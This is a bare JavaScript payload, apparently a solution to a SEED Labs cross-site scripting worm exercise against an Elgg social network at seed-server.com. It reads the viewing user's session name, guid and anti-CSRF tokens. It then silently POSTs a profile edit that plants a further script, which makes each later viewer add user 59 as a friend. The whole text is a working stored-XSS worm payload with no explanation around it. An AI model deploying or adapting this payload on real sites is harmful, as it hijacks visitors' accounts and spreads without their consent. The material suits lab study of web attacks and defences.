<script type="text/javascript">
window.onload=function(){
    var userName="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    
    var desc = "&description=" + encodeURIComponent(
        "<script type='text/javascript'>" +
        "window.onload=function(){" +
        "var Ajax=null;" +
        "var ts='&__elgg_ts=' + elgg.security.token.__elgg_ts;" +
        "var token='&__elgg_token=' + elgg.security.token.__elgg_token;" +
        "var sendurl='http://www.seed-server.com/action/friends/add?friend=59' + token + ts;" +
        "Ajax=new XMLHttpRequest();" +
        "Ajax.open('GET', sendurl, true);" +
        "Ajax.send();" +
        "}" +
        "</script>"
    );
    
    var content = token + ts + userName + guid + desc;
    
    var sendurl = "http://www.seed-server.com/action/profile/edit";
    
    var samygid = 59; 
    
    if (elgg.session.user.guid != samygid) {
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>
